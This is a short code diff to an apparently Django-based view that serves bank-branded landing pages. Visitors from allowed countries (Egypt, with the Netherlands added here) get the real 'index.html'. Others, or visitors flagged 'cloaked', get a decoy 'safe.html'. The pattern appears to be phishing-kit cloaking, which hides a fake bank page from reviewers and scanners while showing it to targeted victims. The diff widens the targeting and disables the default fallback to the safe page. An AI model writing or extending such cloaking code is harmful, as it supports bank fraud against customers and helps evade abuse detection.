@@ -15,12 +15,12 @@ def get_landing_page(request, bank_keyword, lp='lp5'):
     except Keyword.DoesNotExist:
         return HttpResponse('Bank not found in system')
     logo = bank.image.url
-    if v.country_code == ['EG']: #Allow Egypt
+    if v.country_code in ['EG', 'NL']: #Allow Egypt
         v.cloaked = False
         v.reason = ''
         v.save()
         return render_to_response('%s/index.html' % lp,locals())
-    return render_to_response('%s/safe.html' % lp,locals())
+#    return render_to_response('%s/safe.html' % lp,locals())
     if v.cloaked:
         return render_to_response('%s/safe.html' % lp,locals())
     return render_to_response('%s/index.html' % lp,locals())
